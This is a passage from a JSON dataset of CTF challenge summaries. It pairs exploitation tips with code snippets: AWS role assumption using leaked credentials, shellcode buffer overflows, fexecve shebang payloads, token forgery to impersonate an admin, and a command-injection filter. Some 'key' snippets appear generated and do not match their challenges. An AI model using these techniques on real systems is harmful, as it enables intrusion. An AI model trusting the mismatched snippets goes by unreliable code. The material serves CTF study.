        "key": "```python  \nif re.search(r'[^();+$\\\\= \\']', payload.replace(\"echo\", \"\")):  \n    bye(\"ERROR invalid characters\")\n\n# real echolords probably wont need more special characters than this  \nif payload.count(\"+\") > 1 or \\  \n        payload.count(\"'\") > 1 or \\  \n        payload.count(\")\") > 1 or \\  \n        payload.count(\"(\") > 1 or \\  \n        payload.count(\"=\") > 2 or \\  \n        payload.count(\";\") > 3 or \\  \n        payload.count(\" \") > 30:  \n    bye(\"ERROR Too many special chars.\")\n\npayload += \"|bash\"*count  \n```"
    },
    {
        "name": "Educated Assumption",
        "write_up": "dataset/raw/Educated Assumption.md",
        "type": "This challenge is a cloud forensics challenge, which involves analyzing and retrieving information from cloud services such as AWS Secret Manager and IAM roles to ultimately access and read a flag stored within a secure setup.",
        "competition": [
            "nullconHackIM/2023-Goa",
            "https://ctftime.org/event/2065/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When possessing leaked AWS credentials, the first step should involve identifying the associated IAM role or user to understand the permissions and scope of the credentials. This is accomplished using the AWS CLI command `aws sts get-caller-identity`. The output of this command reveals the `UserId`, which includes the role name and session name, the `Account` ID, and the role's ARN, which are crucial for determining the next steps in permission escalation or resource access.",
            "To access AWS resources across account boundaries, it's possible to leverage permissions associated with an IAM role to assume another role in a different account, provided that the `sts:AssumeRole` permission is granted and conditions such as `sts:ExternalId` are satisfied. This technique is particularly useful in scenarios where inter-account resource access is necessary, such as accessing AWS Secret Manager secrets in another account. The AWS CLI command sequence involves first retrieving and analyzing the IAM role's permissions with `aws iam get-policy` and `aws iam get-policy-version`, and then assuming the target role using `aws sts assume-role` with the necessary parameters like `role-arn`, `external-id`, and `role-session-name`. Example payload for assuming a role:\n\n   ```bash\n   aws sts assume-role --role-arn arn:aws:iam::562778112707:role/role_to_secretsmanager_read_flag --external-id nullcon-external-id --role-session-name test\n   ```"
        ],
        "key": "```json\n{\n   \"PolicyVersion\": {\n       \"Document\": {\n           \"Version\": \"2012-10-17\",\n           \"Statement\": [\n               {\n                   \"Sid\": \"VisualEditor1\",\n                   \"Effect\": \"Allow\",\n                   \"Action\": [\n                       \"iam:GetRole\",\n                       \"iam:ListAttachedRolePolicies\"\n                   ],\n                   \"Resource\": [\n                       \"arn:aws:iam::743296330440:role/role_for-lambda-to-assume-role\"\n                   ]\n               },\n               {\n                   \"Sid\": \"VisualEditor3\",\n                   \"Effect\": \"Allow\",\n                   \"Action\": [\n                       \"iam:GetPolicyVersion\",\n                       \"iam:GetPolicy\",\n                       \"iam:GetRolePolicy\"\n                   ],\n                   \"Resource\": [\n                       \"arn:aws:iam::743296330440:policy/permission-boundary_restrict-assumptions\",\n                       \"arn:aws:iam::743296330440:policy/policy_role-lambda-sts-assume-all\"\n                   ]\n               },\n               {\n                   \"Sid\": \"VisualEditor2\",\n                   \"Effect\": \"Allow\",\n                   \"Action\": \"sts:AssumeRole\",\n                   \"Resource\": \"arn:aws:iam::*:role/role_to_secretsmanager_read_flag\",\n                   \"Condition\": {\n                       \"StringEquals\": {\n                           \"sts:ExternalId\": \"nullcon-external-id\"\n                       }\n                   }\n               }\n           ]\n       },\n       \"VersionId\": \"v9\",\n       \"IsDefaultVersion\": true,\n       \"CreateDate\": \"2023-08-17T20:54:35+00:00\"\n   }\n}\n```"
    },
    {
        "name": "ein-pfund-mails",
        "write_up": "dataset/raw/ein-pfund-mails.md",
        "type": "misc",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 440,
        "max_score": 500,
        "difficulty": 0.88,
        "knowledge": [
            "When dealing with a large set of similar data files containing a flag, such as emails, and each file has distinct signatures like DKIM, using a signature verification approach can efficiently identify the unaltered, valid file containing the correct flag. DKIM (DomainKeys Identified Mail) can be particularly useful for verifying the sender and content integrity of an email. This method is relevant in scenarios where integrity and authenticity of each file need to be confirmed to find a valid flag.",
            "Automation with a combination of simple Bash scripts and existing CLI tools (e.g., `check-dkim` for DKIM verification) can significantly streamline the process of checking the integrity and authenticity of multiple files. This approach is effective in scenarios with numerous files where manually verifying each file's integrity is impractical. The Bash script should iterate over each file, using the CLI tool to verify the signature, and flag any files that successfully pass the verification process. Example Bash command:\n   ```bash\n   find \"$1\" -iname *.eml -type f -exec echo -ne \"FILE: {} --- \" \\; -exec check-dkim {} \\;\n   ```"
        ],
        "key": "```python\nimport email\nimport dkim\n\ndef verify_dkim(eml_file):\n    with open(eml_file, 'rb') as f:\n        msg = email.message_from_binary_file(f)\n        if dkim.verify(msg):\n            print(f\"DKIM verified successfully for {eml_file}\")\n        else:\n            print(f\"Error verifying DKIM for {eml_file}\")\n\n# Example usage\nverify_dkim('mail/438b5.eml')\n```"
    },
    {
        "name": "El Primo",
        "write_up": "dataset/raw/El Primo.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 60,
        "max_score": 100,
        "difficulty": 0.6,
        "knowledge": [
            "When encountering binaries with the `gets` function, a buffer overflow vulnerability is likely present, allowing for arbitrary code execution. If NX (No Execute) is disabled for the binary, the attack vector includes injecting shellcode directly into the buffer and executing it. The exploit involves carefully crafting a payload that includes the shellcode, padding if necessary, the adjusted base pointer to preserve stack integrity, and the return address pointing to the injected shellcode. This technique is effectively used when direct execution of injected code is possible due to the absence of execution prevention mechanisms.\n\nExample payload structure: `shellcode + padding + adjusted_ebp + return_address_to_shellcode`",
            "Leaking memory addresses via `printf` or similar functions can be critical in bypassing ASLR (Address Space Layout Randomization) by revealing exact memory addresses in use by the application. In the scenario where an application leaks a buffer's memory address, this information can be utilized to dynamically calculate other relevant addresses (such as the return address or variables' addresses) needed for crafting an exploit payload, specifically when direct memory address manipulation is required to achieve code execution.\n\nExample technique application: `buf_addr` variable used to calculate `ebp_value` and finalize the payload with `p32(buf_addr)` pointing to the start of the injected shellcode"
        ],
        "key": "```c\nundefined4 main(void)  \n{  \n char local_30 [32];  \n undefined *local_10;  \n  \n local_10 = &stack0x00000004;  \n setbuf(stdout,(char *)0x0);  \n setbuf(stdin,(char *)0x0);  \n setbuf(stderr,(char *)0x0);  \n puts(\"What\\'s my hard counter?\");  \n printf(\"hint: %p\\n\",local_30);  \n gets(local_30);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Elegant Curve",
        "write_up": "dataset/raw/Elegant Curve.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
        "knowledge": [
            "For challenges involving solving discrete logarithms on Elliptic Curve Cryptography (ECC), if given anomalous curve parameters and a prime `p` that is not too large, the Smart's Attack can be applied effectively. Smart's Attack utilizes the properties of an anomalous curve (an elliptic curve over a field F_p with exactly p points) to compute discrete logarithms efficiently. This method is particularly useful when traditional discrete logarithm problem (DLP) solvers are infeasible due to computational constraints.",
            "When provided with two elliptic curves over finite fields, if the order of one curve is smooth (the prime factorization of the curve's order only contains small prime numbers), it's feasible to employ the Pohlig-Hellman algorithm to solve the discrete logarithm problem for that curve. This approach takes advantage of the smoothness of the curve's order to break the DLP into smaller, more manageable problems. This strategy works best when the largest prime factor of the curve's order is significantly smaller than the order itself, reducing the complexity of the DLP to that of solving multiple smaller DLPs.\n\nSample Python code block to implement Smart's Attack (specifically tailored and simplified to fit within the provided scenario context, but adjustable for general use):\n\n```python\nfrom sage.all import *\n\ndef SmartAttack(P, Q, p):\n    \"\"\"\n    Solve discrete logarithm for P, Q on an elliptic curve over a finite field of prime order p using Smart's attack.\n    :param P: Base point on the elliptic curve.\n    :param Q: Target point on the elliptic curve.\n    :param p: Prime order of the finite field.\n    :return: The discrete logarithm of Q to the base P.\n    \"\"\"\n    E = P.curve()\n    Eqp = EllipticCurve(Qp(p, 2), [ZZ(t) + randint(0, p)*p for t in E.a_invariants()])\n\n    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)\n    for P_Qp in P_Qps:\n        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:\n            break\n\n    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)\n    for Q_Qp in Q_Qps:\n        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:\n            break\n\n    phi_P = -(P_Qp.xy()[0]/P_Qp.xy()[1])\n    phi_Q = -(Q_Qp.xy()[0]/Q_Qp.xy()[1])\n    k = phi_Q / phi_P\n    return ZZ(k)\n```\n\nNote: The use of SageMath (imported as `sage.all`) is necessary for ECC operations, `Qp`, and other algebraic manipulations provided in the code."
        ],
        "key": "```python\ndef tonelli_shanks(n, p):  \n   if pow(n, int((p-1)//2), p) == 1:  \n           s = 1  \n           q = int((p-1)//2)  \n           while True:  \n               if q % 2 == 0:  \n                   q = q // 2  \n                   s += 1  \n               else:  \n                   break  \n           if s == 1:  \n               r1 = pow(n, int((p+1)//4), p)  \n               r2 = p - r1  \n               return r1, r2  \n           else:  \n               z = 2  \n               while True:  \n                   if pow(z, int((p-1)//2), p) == p - 1:  \n                       c = pow(z, q, p)  \n                       break  \n                   else:  \n                       z += 1  \n               r = pow(n, int((q+1)//2), p)  \n               t = pow(n, q, p)  \n               m = s  \n               while True:  \n                   if t == 1:  \n                       r1 = r  \n                       r2 = p - r1  \n                       return r1, r2  \n                   else:  \n                       i = 1  \n                       while True:  \n                           if pow(t, 2**i, p) == 1:  \n                               break  \n                           else:  \n                               i += 1  \n                       b = pow(c, 2**(m-i-1), p)  \n                       r = r * b % p  \n                       t = t * b ** 2 % p  \n                       c = b ** 2 % p  \n                       m = i  \n   else:  \n       return False\n\ndef add(A, B, p):  \n   if A == 0:  \n       return B  \n   if B == 0:  \n       return A  \n   l = ((B[1] - A[1]) * inverse(B[0] - A[0], p)) % p  \n   x = (l*l - A[0] - B[0]) % p  \n   y = (l*(A[0] - x) - A[1]) % p  \n   return (int(x), int(y))\n\ndef double(G, a, p):  \n   if G == 0:  \n       return G  \n   l = ((3*G[0]*G[0] + a) * inverse(2*G[1], p)) % p  \n   x = (l*l - 2*G[0]) % p  \n   y = (l*(G[0] - x) - G[1]) % p  \n   return (int(x), int(y))\n\ndef multiply(point, exponent, a, p):  \n   r0 = 0  \n   r1 = point  \n   for i in bin(exponent)[2:]:  \n       if i == '0':  \n           r1 = add(r0, r1, p)  \n           r0 = double(r0, a, p)  \n       else:  \n           r0 = add(r0, r1, p)  \n           r1 = double(r1, a, p)  \n   return r0\n\ndef random_point(a, b, p):  \n   while True:  \n       x = getRandomRange(1, p-1)  \n       try:  \n           y, _ = tonelli_shanks((x**3 + a*x + b) % p, p)  \n           return (x, y)  \n       except:  \n           continue\n```"
    },
    {
        "name": "Elements",
        "write_up": "dataset/raw/Elements.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 107,
        "max_score": 1000,
        "difficulty": 0.107,
        "knowledge": [
            "When faced with optimization problems in CTF challenges, especially those involving error-prone floating-point computations, the Covariance Matrix Adaptation Evolution Strategy (CMA-ES) can be an effective method for finding approximate solutions that meet given constraints. CMA-ES excels in dealing with noisy functions where traditional optimization approaches might struggle. This approach is applicable when precise values are difficult to calculate directly or through simple brute force alone. The technique is particularly useful for adjusting variables to satisfy multiple constraints simultaneously, as demonstrated with the circumradius and inradius constraints.\n\n```python\nimport cma\nfrom math import sqrt\n\n# Example setup based on challenge requirements\nks = 0x391BC2164F0A\nkr = 1.940035480806554e13\nkR = 4.777053952827391e13\n\ndef radiusFit(s):\n    # Implementation of the error function based on problem constraints\n    return abs(distr) + abs(distR)\n\n# Optimization process\nes = cma.CMAEvolutionStrategy([initial_guesses], sigma)\nes.optimize(radiusFit)\n```",
            "If an optimization technique like CMA-ES brings a solution close to the correct answer within a small error margin, brute-forcing within a limited range around the obtained values can efficiently pinpoint the exact solution. This strategy leverages the strength of optimization algorithms to reduce the search space significantly, thus making brute force a viable next step. This approach is most suitable when the exact solution is required, and the search space has been narrowed to a feasible size where brute-forcing will not be computationally prohibitive.\n\n```python\nimport subprocess\nfrom multiprocessing.dummy import Pool as ThreadPool\n\n# Adjusted values from optimization step\nd = [0x391BC2164F0A, optimized_value1, optimized_value2]\n\nDELTARANGE = 0x100  # Defined range for brute-forcing based on optimization results\n\ndef run(d1):\n    # Brute-forcing logic to adjust values within the DELTARANGE\n    return payload\n\n# Parallel brute-forcing to expedite the search\npool = ThreadPool(8)\nresults = pool.map(run, list(range(-DELTARANGE, DELTARANGE + 1)))\n```"
        ],
        "key": "```python  \nimport cma  \nfrom math import sqrt\n\nks = 0x391BC2164F0A  \nkr = 1.940035480806554e13  \nkR = 4.777053952827391e13\n\ndef radiusFit(s):  \n   v19 = ks*ks + s[0]*s[0] - s[1]*s[1]  \n   S_in = 4*ks*ks*s[0]*s[0] - v19*v19  \n   if S_in < 0:  \n       return float('inf')  \n   S = sqrt(S_in) / 4  \n   cr = 2*S / (ks + s[0] + s[1])  \n   cR = (ks*s[0]*s[1]) / (4*S)  \n   distr = (kr - cr)  \n   distR = (kR - cR)  \n   print(distr, distR)  \n   return abs(distr) + abs(distR)\n\nes = cma.CMAEvolutionStrategy([70789268583970.951, 95523433899867.88], 0.2)  \nes.optimize(radiusFit, min_iterations=500)  \nprint(es.result_pretty())  \n```"
    },
    {
        "name": "elf-crafting-v1",
        "write_up": "dataset/raw/elf-crafting-v1.md",
        "type": "pwn",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing binary challenges, especially those involving file operations and execution, `memfd_create` and `fexecve` functions indicate an opportunity for executing shellcode or commands in memory by creating an anonymous file in RAM. This technique is useful for executing arbitrary code supplied by the user without touching the file system, thus avoiding detection based on file system activities.",
            "To execute command lines or scripts via file descriptors passed to `fexecve`, prepend the input with a shebang (`#!`) followed by the command to be executed. This approach exploits the functionality of `fexecve` to execute the program referred to by a file descriptor, allowing for the execution of scripts or commands directly from memory.\n   - Example payload for executing `/bin/cat` to read the flag: `#!/bin/cat flag.txt`"
        ],
        "key": "```c\nint main(int param_1,char **param_2,char **param_3) {  \n int fd;  \n ulong ret;  \n long in_FS_OFFSET;  \n char buffer [40];  \n long canary;  \n  \n canary = *(long *)(in_FS_OFFSET + 0x28);  \n setbuf(stdout,(char *)0x0);  \n setbuf(stderr,(char *)0x0);  \n puts(\"I\\'m sure you all enjoy doing shellcode golf problems.\");  \n puts(\"But have you ever tried ELF golfing?\");  \n puts(\"Have fun!\");  \n fd = memfd_create(\"golf\",0);  \n if (fd < 0) {  \n   perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n ret = read(0,buffer,32);  \n if ((int)ret < 0) {  \n   perror(\"failed to execute ok = read(0, buffer, 32)\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n printf(\"read %d bytes from stdin\\n\",ret & 0xffffffff);  \n ret = write(fd,buffer,(long)(int)ret);  \n if ((int)ret < 0) {  \n   perror(\"failed to execute ok = write(fd, buffer, ok)\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n printf(\"wrote %d bytes to file\\n\",ret & 0xffffffff);  \n fd = fexecve(fd,param_2,param_3);  \n if (fd < 0) {  \n   perror(\"failed to execute fexecve(fd, argv, envp)\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n if (canary != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "Elgyem's Password",
        "write_up": "dataset/raw/Elgyem's Password.md",
        "type": "web",
        "competition": [
            "UMDCTF/2023",
            "https://ctftime.org/event/1949/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with machine learning (ML) models in a CTF challenge that only use linear layers (e.g., a sequence of linear transformations without non-linear activation functions), it's possible to simplify the model into a single linear equation by combining all the weights and biases. This simplification is based on the mathematical property that sequential linear transformations can be combined into one. This approach reduces the complexity of the model, making it easier to analyze or manipulate, especially in challenges requiring understanding or inverting the model's computations.\n   \n   To combine two linear layers:\n   \\[\n   a_{j} = a_0 \\prod_{i=0}^{j-1} w_i    + \\sum_{i=0}^{j-1} b_i \\prod_{k=i+1}^{j-1} w_k\n   \\]\n   where \\(a_j\\) is the activation (output) of layer \\(j\\), \\(a_0\\) is the input, \\(w_i\\) are the weight matrices, and \\(b_i\\) are the bias vectors.",
            "When finding inputs to produce a specific output from an ML model, and when accurate numeric computation is crucial, using a solver that supports constraints and arbitrary precision arithmetic can be effective. Z3 Theorem Prover is particularly useful for problems where the inputs and/or structure of the data have known characteristics (e.g., starting pattern of the input, integer values). In such a scenario, you can model the problem as a set of linear equations with constraints based on these characteristics and use Z3 to find solutions that satisfy both the equations and the constraints.\n\n   Example of setting constraints with Z3 for known input patterns:\n   \\[\n   \\text{Let } input[0..7] = \\text{ASCII encoding of } 'UMDCTF{\\{' \n   \\]\n   And then use Z3 to solve for the rest of the input, ensuring each character is an integer value within the expected range (e.g., ASCII printable characters)."
        ],
        "key": "```python  \nmodel = nn.Sequential(  \n   nn.Linear(22, 69),  \n   nn.Linear(69, 420),  \n   nn.Linear(420, 800),  \n   nn.Linear(800, 85),  \n   nn.Linear(85, 13),  \n   nn.Linear(13, 37)  \n)  \n```"
    },
    {
        "name": "elytra",
        "write_up": "dataset/raw/elytra.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "When dealing with challenges that involve comparing two texts or files, differences in line endings (e.g., `\\r\\n` vs. `\\n`) can be a deliberate hint or manipulation to encode information, such as binary data that can be translated into a flag. Condition: This approach is effective when the challenge hints at or involves discrepancies between two seemingly identical texts or files.\n   - Sample observation: Some lines in a provided file are terminated with `\\r\\n`, while others are terminated with `\\n`.",
            "Binary data can be encoded based on the presence or absence of specific characters or sequences at the end of lines within a text. This method can be decoded by converting sequences (e.g., `1` for `\\r` and `0` for the absence of `\\r`) back into characters or readable format to extract hidden information or flags. Condition: This is particularly useful when a challenge provides a file with subtle variations in formatting or encoding that don't immediately appear to carry meaning.\n   - Sample payload: `int(''.join(['1' if x[-1] == '\\r' else '0' for x in text.split('\\n') if len(x) > 0]),2)` converts the line-ending pattern to binary, which is then converted to bytes and decoded to reveal the flag."
        ],
        "key": "```python\ntext=open('iwon.txt','r', newline='').read()  \nflag_l = int(''.join(['1' if x[-1] == '\\r' else '0' for x in o.split('\\n') if\nlen(x) > 0]),2)  \nprint(long_to_bytes(flag_l).decode())  \n```"
    },
    {
        "name": "Encoding",
        "write_up": "dataset/raw/Encoding.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When confronted with an encoded message that does not fit common cryptographic methods (e.g., Caesar cipher, monoalphabetic substitution), consider the possibility of it being in an encoding format like base32, especially if the ciphertext consists solely of uppercase letters and equals signs. After base32 decoding, further transformations might be required depending on the context, such as URL decoding or interpreting as Morse code.\n    - Example for base32 decoding (Python): `import base64; decoded_msg = base64.b32decode('ENCODED_MESSAGE')`",
            "Encoded messages might be layered with multiple encoding schemes. It's critical to recognize patterns or hints that suggest a specific encoding. After decoding from one format, the output should be carefully analyzed to determine if it represents another form of encoded data, such as hexadecimal, Morse code, or base64. Each layer must be decoded sequentially to unveil the hidden message or flag.\n    - Hex to text decoding (Python example): `bytearray.fromhex('HEX_STRING').decode()`  \n    - Base64 decoding (Python example): `import base64; base64.b64decode('BASE64_STRING')`"
        ],
        "key": "```python\ndef vulnerable_base32_decode(encoded_str):\n    # This function simulates a vulnerable base32 decoding process\n    # that could be exploited if not properly handled.\n    import base64\n    try:\n        # Attempt to decode the base32 encoded string\n        decoded_bytes = base64.b32decode(encoded_str)\n        return decoded_bytes.decode('utf-8')\n    except Exception as e:\n        # Improper error handling could lead to information disclosure\n        print(f\"Error decoding base32: {e}\")\n        return None\n\n# Example usage\nciphertext = \"EUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERBFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERBFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIUSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEIJJSIQSTEMBFGJCSKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMSEEUZDAJJSIQSTERJFGJCSKMSFEUZEKJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSEEUZEKJJSIUSTERJFGIYCKMSFEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERBFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIUSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCCKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSFEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIQSTERBFGJCSKMSFEUZEKJJSGASTERJFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEIJJSIQSTEMBFGJCSKMSEEUZEIJJSIQSTERBFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEIJJSIQSTERBFGJCSKMSFEUZDAJJSIQSTERBFGJCSKMSFEUZEKJJSGASTERJFGJCCKMRQEUZEKJJSIUSTERJFGJCSKMSEEUZDAJJSIQSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIQSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMRQEUZEKJJSIUSTERJFGJCSKMSFEUZDAJJSIQSTERBFGJCCKMSFEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEIJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSEEUZDAJJSIUSTERJFGJCSKMSFEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIUSTEMBFGJCSKMSFEUZEKJJSIQSTERBFGIYCKMSFEUZEKJJSIQSTERBFGJCCKMRQEUZEIJJSIUSTERJFGJCSKMSFEUZDAJJSIUSTERBFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSFEUZEKJJSIQSTEMBFGJCSKMSFEUZEKJJSIUSTERBFGIYCKMSEEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIUSTERJFGJCCKMSEEUZDAJJSIUSTERJFGJCCKMSEEUZEIJJSGASTERJFGJCSKMSEEUZEKJJSGASTERBFGJCSKMSFEUZEKJJSIUSTEMBFGJCCKMSFEUZEKJJSIUSTERJFGIYCKMSFEUZEKJJSIUSTERJFGJCSKMRQEUZEKJJSIQSTERBFGJCCKMSEEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSFEUZDAJJSIUSTERJFGJCSKMSEEUZEIJJSGASTERBFGJCSKMSF\"\ndecoded_message = vulnerable_base32_decode(ciphertext)\nprint(decoded_message)\n```"
    },
    {
        "name": "enCRCroach",
        "write_up": "dataset/raw/enCRCroach.md",
        "type": "web",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with encrypted tokens using AES-CTR, the property of XOR operations in both the encryption scheme and error-checking algorithms (like CRC) can be exploited to modify encrypted information without needing to decrypt it first. Specifically, because AES-CTR mode's encryption is just XORing a secret value against the plaintext, flipping a bit in the ciphertext results in the corresponding flip in the plaintext. Similarly, with CRC, if you know the desired change, you can compute the necessary CRC change by XORing the CRC of the original message, the CRC of the message with your changes, and the CRC of an all-zero message. This approach allows modification of certain parts of the encrypted message (like a username) without needing to know the original content or CRC.",
            "In scenarios involving secure hash algorithm verification like PBKDF2 hashes, tools such as John the Ripper can be utilized for brute-forcing the hashes to recover passwords. This is especially useful in contexts where direct access to password information is not available, but a hash of the password is. For example, with specific formats provided for input, John the Ripper can efficiently process through a list of potential passwords to locate the correct one, facilitating access to encrypted or protected resources like user tokens in the challenge described.\n\nExample payload for modification part:  \n```  \nuser_xor = xor_bytes(current_user.encode(), desired_user.encode())\nmac_xor = xor_bytes(gen_mac(iv_xor + user_xor + nonce_xor), gen_mac(bytes(len(iv_xor + user_xor + nonce_xor))))\nhacked_token = xor_bytes(token, iv_xor + user_xor + nonce_xor + mac_xor)\n```"
        ],
        "key": "```python\ndef hack_token(token: bytes, current_user: str, desired_user: str) -> bytes:  \n   # And what do you know... \"admin\" and \"azure\" are the same length...  \n   assert len(current_user) == len(desired_user)\n\n   # These are not modified (just an XOR of zeros)  \n   iv_xor = bytes(IV_LEN)  \n   nonce_xor = bytes(NONCE_LEN)\n\n   # Compute the change to the user field that we want to see  \n   user_xor = xor_bytes(current_user.encode(), desired_user.encode())\n\n   # Compute the change to the CRC/MAC we want to see  \n   # Note that we can omit leading zeros if we want (iv_xor), but not\ntrailing.  \n   mac_xor = xor_bytes(  \n       gen_mac(iv_xor + user_xor + nonce_xor),              # CRC(the change)  \n       gen_mac(bytes(len(iv_xor + user_xor + nonce_xor)))   # CRC(all zeros)  \n   )\n\n   # Modify the token and return  \n   hacked_token = xor_bytes(token, iv_xor + user_xor + nonce_xor + mac_xor)  \n   return hacked_token\n```"
    },
    {
        "name": "Encrypt0r",
        "write_up": "dataset/raw/Encrypt0r.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 492,
        "max_score": 1000,
        "difficulty": 0.492,
        "knowledge": [
            "When dealing with an RSA encryption challenge where you have access to an encryption oracle, you can find the modulus `n` by noticing how special values are encrypted. Specifically, encrypting `-1` can return `n - 1` due to modular arithmetic properties, instantly revealing `n` when `n - 1` is added by 1.",
            "To find the RSA encryption exponent `e` when the modulus `n` is known, especially when common values like `e = 65537` do not apply, iterate over potential values of `e` by encrypting a known value (such as 2) with each potential `e` until the output matches the encrypted output provided by the challenge, then solve for `e`. A Python sample for iterating over `e` values:\n```python\nn = 943005855809379805541572246085636463198876208104363395594608 + 1\nenc_2 = 405518048190558088634310202493589629933137815074909354184258\ntmp = 1\nfor guessed_e in range(2 ** 17):\n   if tmp == enc_2:\n       print(guessed_e)  # This prints the correct value of e\n       break\n   tmp *= 2\n   tmp %= n\n```"
        ],
        "key": "```python\ndef encrypt(message, e, n):\n    return pow(message, e, n)\n\ndef decrypt(ciphertext, d, n):\n    return pow(ciphertext, d, n)\n\n# Example of vulnerable code\ndef main():\n    n = 943005855809379805541572246085636463198876208104363395594608 + 1\n    e = 65537\n    # d is calculated using the private key components p and q\n    d = modinv(e, (p-1)*(q-1))  # p and q are not shown here\n\n    # Vulnerable to chosen ciphertext attack\n    message = int(input(\"Enter a number to encrypt: \"))\n    encrypted_message = encrypt(message, e, n)\n    print(f\"Encrypted: {encrypted_message}\")\n\n    # Decrypting without proper checks\n    decrypted_message = decrypt(encrypted_message, d, n)\n    print(f\"Decrypted: {decrypted_message}\")\n\nmain()\n```"
    },
    {
        "name": "Encryption Service",
        "write_up": "dataset/raw/Encryption Service.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2019",
            "https://ctftime.org/event/757/tasks/"
        ],
        "score": 1200,
        "max_score": 2000,
        "difficulty": 0.6,
        "knowledge": [
            "In challenges featuring heap vulnerabilities, if a program does not clear or nullify pointers after freeing memory, it can lead to use-after-free vulnerabilities. These vulnerabilities can be exploited by allocating controlled data in the freed object's place, enabling control over function pointers or metadata for further exploitation.",
